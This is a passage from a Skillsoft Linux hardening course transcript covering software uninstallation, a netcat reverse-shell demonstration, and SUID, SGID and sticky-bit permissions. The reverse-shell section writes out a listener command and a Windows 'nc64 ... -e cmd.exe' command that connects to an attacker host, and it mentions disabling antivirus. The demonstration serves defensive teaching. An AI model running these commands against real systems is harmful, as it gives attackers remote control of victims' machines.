+One is clicking installed at the top. Here we’ve got all of the software installed on this machine showing up, and we have the option of uninstalling it. In this case, because this is a user-client environment, we have a lot of client software like the Firefox web browser, the gedit graphical editor, the GNOME Calculator, and so on. But it's pretty easy to simply do an uninstallation on this given host.
+
+The other thing we always have to consider are the updates. If there are updates available, then they will be shown here and we can choose to update. But again, we're doing this manually on a single Linux host. In a larger environment, you need to have a solution where you can do this centrally. Whether you’re using products like Puppet or Chef or Ansible. Or in the cloud, if you’re using, for instance, Amazon Web Services, you can have all of your virtual machines registered centrally, so you can list software installed on them.
+
+You can deploy scripts to run on a schedule from a centralized location. You can apply updates centrally. So while it's important to know how to do this on a single host, think about how scalable that will be in a larger environment.
+
+8. Video: Configuring a Linux Reverse Shell (it_oslsec_04_enus_08)
+
+Find out how to set and mitigate reverse shell configurations in Linux.
+set and mitigate reverse shell configurations in Linux
+[Video description begins] Topic title: Configuring a Linux Reverse Shell. Your host for this session is Dan Lachance. [Video description ends]
+Reverse shells have long been a tool used by malicious actors. The nature of a reverse shell is that on the attacker’s machine they will set up a listener, maybe on port 80. And then what they’ll do is infect victim-client machines that will make a connection to the listener on the attacker’s machine and present a command prompt, which actually stems from the victim’s computer, but it shows up on the attacker machine.
+
+And if the attacker is setting up a listening connection on a standard port like 80, on the victim’s network and from their computer’s perspective, it just looks like outgoing port 80 traffic, which doesn’t look suspicious, at least not normally.
+
+If you have a threat-hunting tool installed, it might detect strange port 80 traffic going to some unknown hostname or IP address.
+
+But at any rate, we’re going to take a look at how to set this up because in knowing this, we can perhaps set security policies in motion to mitigate this kind of a problem.
+
+So here, I’ve navigated in my browser to eternallybored.org/misc/netcat/ We’re going to use the Netcat tool to set up this reverse shell. So, I've already downloaded and unzipped netcat, the latest version. [Video description begins] A webpage is open. The header reads: netcat 1.11 for Win32/Win64. He reads out the site name. The netcat latest version name reads: netcat 1.12. [Video description ends] Now, you might have to temporarily turn off real-time virus protection on your machine if you have it installed because it will detect this as some kind of a Trojan. But when we have control of it in this testing environment, it’s okay! Whenever you temporarily turn off your real-time protection, first of all, make sure that’s in line with your organizational security policies and it’s not a production machine. And secondly, make sure you turn it back on, even if it’s a testing station.
+
+Now on Linux, you won't have to download or install anything. I've got that downloaded and unzipped on a Windows computer. [Video description begins] The presenter opens a blank Linux host page. The title reads: cblackwell@ubuntu2:~ [Video description ends] Realistically, the attacker would somehow trick the Windows user into, perhaps, clicking a link in an email message or downloading a file attachment. Standard social engineering, phishing type of stuff.
+
+But the attacker has to have a listener running on their station. So the way we’ll do that, and we'll assume this Linux host we are looking at is our attacker station. This is where the attacker sits. So sudo nc for netcat, -l for listen, v for verbose, and p for port. Why don't we just listen on port 80? You can choose any port number, and that’s it!
+
+It says- Listening on 0.0.0.0, which really just means all IPs on this host. And then port 80. What is it listening for? It’s listening for victim-infected computers to make a connection out to this attacker machine. Think about that now because most firewall configurations are focused on traffic initiated from public networks like the Internet coming in. That won't be the case here because the traffic will show as being initiated from inside the network from the infected computer’s perspective. It’ll come out to the attacker station. Interesting!
+
+So that can defeat some basic firewall configurations, packet filtering firewalls, depending on how they're set up, or NAT configurations.
+
+Now here on the Windows computer, which we're calling the victim or the infected machine, we are manually running netcat. But again, the attacker would deploy a campaign that would somehow trick users into having this type of command executed behind the scenes. What’s the command? Well, I’m in PowerShell. [Video description begins] A Windows PowerShell page is open. The first line of command reads: PS C: \Users\cyber\Downloads\netcat-win32-1.12> ./nc64 192.168.2.156 80 -e cmd.exe [Video description ends]
+
+So even though, I’m in the same subdirectory where the executable is, which is called nc64.exe PowerShell, I’ll still put in ./ because this path is not in my path variable. So ./nc64 the IP address of the attacker’s system where it’s listening on port 80 -e for execute. Well, what do we want to execute? And this would be something we’re executing locally here on the victim’s Windows computer. And we want to present it to the attacker station. I want to run a command prompt cmd.exe that’s how you load a command prompt on the Windows machine.
+
+However, the cool thing about this is it’s going to show up as a Windows Command prompt on the attacker’s station. Let’s see if that’s true! Let’s press Enter.
+
+Okay, so all we get is a blinking command prompt. It has made the connection over the network. And so on the network, it will look like port 80 traffic. So standard HTTP web traffic leaving this victim’s computer going out somewhere on the Internet.
+
+Here we are back on our Linux machine. What do we have here? We have a Microsoft Windows Command prompt. [Video description begins] The Microsoft Windows Command prompt reads: Microsoft Windows [Version 10.0.22621.1848] (c) Microsoft Corporation. All rights reserved. [Video description ends] But wait a minute, this is Linux. Yes! But whatever’s happening with cmd.exe so we’ve spawned an instance of that Windows side and presented it here.
+
+I have the whole subdirectory path. I can issue Windows commands dir. Change directory to the root of the Windows file system. Now I’m viewing everything on that Windows machine. [Video description begins] A list of directories appears as an output on the screen. It shows the date, time, and name of the directories. [Video description ends] So I’ve got a reverse shell, I can execute programs on that machine. I can work with files on that machine.
+
+And if I were to run notepad here from Linux, well that's not going to run on the Linux machine. This is a remote reverse shell. What we type in here happens on the infected machine. In other words, I'll be running notepad on the machine. Let’s see if that’s true, I’ll press Enter. So here in Linux, it just returns notepad, so it launched successfully.
+
+And on the target Windows computer, sure enough, notepad is now showing as being up and running. Think about the power that the attacker has in this type of a situation. This is one of the many reasons we should have an up-to-date virus scanner on machines, have an active threat-hunting tool that looks for potentially suspicious activity such as port 80 traffic going to some random IP, that’s not normal.
+
+Especially, if it happens in the middle of the night without a user being signed in. So all of these things we have to consider when it comes to securing our Linux hosts.
+
+9. Video: Managing Advanced File System Permissions (it_oslsec_04_enus_09)
+
+In this video, learn how to determine when and how to set the SUID, group ID (GID), and sticky bet permissions.
+determine when and how to set the SUID, group ID (GID), and sticky bet permissions
+[Video description begins] Topic title: Managing Advanced File System Permissions. Your host for this session is Dan Lachance. [Video description ends]
+In this demonstration, I will be managing advanced file system permissions. Now, what do I mean when I say advanced? We're talking about things like the sticky bit, the group ID bit, the user ID bit. Let’s talk about what this means. [Video description begins] A blank Linux host page is open. The title reads: cblackwell@ubuntu2 :~$ [Video description ends] We'll start with the sticky bit.
+
+So the purpose here of the sticky bit is to ensure only that file owners can delete their own files in a shared directory. They can’t delete other people’s files regardless of the permissions that are assigned.
+
+So as an example, let’s go to the route here on our Linux host. I’ll run sudo mkdir. Let’s call it shared_files. If i do an ls -ld of shared_files/, now I added the -d I don’t want to show what’s in that directory, I want to show the directory entry itself. Notice the permissions, it’s a d for directory. Read, write, execute for the owning user, read and execute for the owning group, and read and execute for everybody else. Okay, that’s fine! [Video description begins] The permission output reads: drwxr-xr-x [Video description ends]
+
+I want to make sure that users can only delete their own files in this location. Well, the first thing I would do here is sudo chmod, let’s say for everybody else, that’s O. I will add the W permission, so o+w.
+
+And of course, we’ll add the subdirectory name at the end there. If we do an ls -ld, notice now everyone has read, write, and execute permissions. Okay! But again, I only want users to be able to delete their own files, so we’re going to set the sticky bit.
+
+To do that, I can run sudo chmod +t that’s what we use for the sticky bit, and then the name of the directory. Now if I do an ls -ld, notice that instead of having rwx for everyone in the position of execute, the t represents that the sticky bit has been set for that directory. Think of these special advanced security permissions kind of to be retrofitted into the existing placeholder system for Linux file system permissions.
+
+Now let’s say, we do an sudo chmod o-x I want to remove the execute permission and that’s for the shared_files directory. Now when we do an ls -ld, notice that the T for the sticky bit shows as capital. Capital implies that there’s nothing else that’s supposed to be there, hence T. There’s no execute permission set for other. Now that's the sticky bit. There are two other special permission bits we need to be aware of.
+
+Let's talk about the user ID bit. So the special user ID bit is often called SUID. Let's create a sample script sudo touch. Let’s change directory into shared_files/. However, I’m going to run sudo chmod o+x and I’m going to add the execute permission back to the shared folders directory to change directory into a directory users will need to read and execute. So change directory into that location. [Video description begins] The presenter clears the screen to run the new command. [Video description ends]
+
+I’m going to run sudo touch script1.sh Okay! And I’ll do an ll. [Video description begins] The presenter clears the screen to run the new command. [Video description ends] So let's say this is an active script that does something. What we can do is flag a file, so it runs as whoever is listed as the owner, as opposed to running with the permissions of whoever invokes it. That’s the special ID bit, the SUID bit. Where the sticky bit permission shows up in the other placeholder section, the SUID bit, if set, shows up in the owner permission section.
+
+Let's see what that means. sudo chmod u, because it’s in the user position, +s and that’s going to be for script1.sh If I do an ll, it’s highlighted in red, but notice we have a S in where you would normally expect [Video description begins] The presenter indicates to the highlighted file: script1.sh [Video description ends] the execute permission to show for the owning user. It’s a S because execute has not been set.
+
+If we set execute, so sudo chmod u, for owning user, +x for script1.sh now when we do an ll, notice that it’s been reduced from a S to a s. So now, whoever executes this script, it will run as the owning user. So whatever the script does, will run as root while it’s running.
+
+You can also do the same type of thing for the owning group of a file. For example, if I do an sudo tail of /etc/group, [Video description begins] The presenter clears the screen to run the new command. [Video description ends] we’ve got a group defined on the system called eastadmins. Let’s use that as our example. Okay! [Video description begins] The presenter clears the screen to run the new command. He runs the command: cblackwell@ubuntu2 : /shared_files $ ll. The output on the screen reads: total 8 [Video description ends] So let’s run sudo chgrp, change group, to eastadmins for script1.sh, and we’ll do an ll. As you might expect, the owning group is now shown as eastadmins.
+
+We know that with the special user ID bit, the SUID bit, it allows whoever invokes a binary or a script, it runs with the owner. Well, we can do the same type of thing but have it run as the group. So with the permissions of the owning group.
+
+To do that, we would run sudo chmod g, for group, +s in this case for script1.sh, let’s do an ll. [Video description begins] The presenter clears the screen to run the new command. [Video description ends] Notice we get a S in the group permission section. S because there is no execute permission for the group.
+
+Now it's also important to understand the numeric values. The S User ID bit has a value of 4, the Group ID bit has a value of 2, and the Sticky bit has a value of 1. I’m just typing this in, it’s not a command, just to demonstrate. So why is that relevant? Well because you might see it sometimes when permissions are being set or the umask is being set.
+
+For example, imagine this, sudo chmod 1660 script1.sh What does that mean? Well, the 1 is for the special permission bit, and we know that the sticky bit has a value of 1. Everything else is regular file system permissions. 6 means read and write, 4+2, for the owning user. The next 6 is read or write, 4+2, for the owning group. And 0 means no permissions for everyone else.
+
+Let’s see if that’s true. Let’s do an ll. Looks about right! There’s 6 read-write, 6 read-write, and then 0 no permissions for everyone else. [Video description begins] The output reads: -rw-rw---T [Video description ends] But the sticky bit has been set, which stems from the 1. So just be aware of those numeric representations as well.
+
+10. Video: Course Summary (it_oslsec_04_enus_10)
+
+In this video, we will summarize the key concepts covered in this course.
+summarize the key concepts covered in this course
+[Video description begins] Topic title: Course Summary. Your host for this session is Dan Lachance. [Video description ends]
+So in this course, we’ve examined how to harden Linux from the boot process all the way through to managing advanced file system security.
+
+We did this by exploring Linux hardening, how to manage UEFI secure boot, and file system permission defaults with a umask.
+
+We then used Nmap to scan a Linux host. We ran a vulnerability scan, and we disabled and removed unnecessary Linux components.
+
+We then configured a Linux reverse shell, and we managed advanced file system permissions.
+
+In our next course, we’ll move on to determine when and how to use SELinux and AppArmor to secure Linux hosts.
+
+© 2023 Skillsoft Ireland Limited - All rights reserved.
